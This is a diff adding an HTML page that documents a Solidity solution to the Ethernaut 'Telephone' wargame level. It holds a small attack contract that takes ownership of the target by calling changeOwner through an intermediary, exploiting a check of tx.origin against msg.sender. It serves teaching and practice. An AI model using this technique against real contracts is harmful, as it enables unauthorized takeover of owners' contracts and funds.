@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <title>Ethernaut 4: Telephone</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" media="all" href="../public/stylesheets/normalize.css" />
+  <link rel="stylesheet" media="all" href="../docco.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="page">
+
+      <div class="header">
+        <h1>Ethernaut 4: Telephone</h1>
+
+        
+      </div>
+      
+        
+        
+        <div class='highlight'><pre><span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.6.0;</span>
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;./04_Telephone.sol&quot;</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">TelephoneAttack</span> </span>{
+    Telephone telephone;
+
+    <span class="hljs-function"><span class="hljs-keyword">constructor</span> (<span class="hljs-params"><span class="hljs-keyword">address</span> telephoneAddr</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        telephone = Telephone(telephoneAddr);
+    }</pre></div>
+      
+        
+        <p>All it takes to set <code>owner</code> on the <code>Telephone</code> instance is that <code>msg.sender</code>
+is not equal to <code>tx.origin</code>. This is achieved by calling <code>changeOwner</code> through
+another contract rather than directly.</p>
+
+        <div class='highlight'><pre>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doChangeOwner</span> (<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        telephone.changeOwner(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>);
+    }
+}</pre></div>
+      
+    </div>
+  </div>
+</body>
+</html>
